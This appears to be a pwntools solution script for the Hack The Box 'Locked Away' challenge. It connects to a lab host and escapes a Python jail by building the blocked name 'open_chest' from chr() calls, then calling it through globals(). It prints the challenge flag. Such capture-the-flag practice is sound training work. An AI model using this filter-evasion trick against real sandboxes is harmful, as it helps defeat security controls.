# HTB Locked Away YS4B

import pwn

host = "94.237.61.197"
port = 36949

msg1 = "a = chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116)" # a = "open_chest"
msg2 = "globals().get(a)()"

s = pwn.connect(host, port)

s.recvuntil(b"...")

s.sendline(bytes(msg1, "utf-8"))

s.recvuntil(b"...")

s.sendline(bytes(msg2, "utf-8"))

flag = s.recvline(b"...")

print(flag) # HTB{D0_1t_Your$3lf:)}

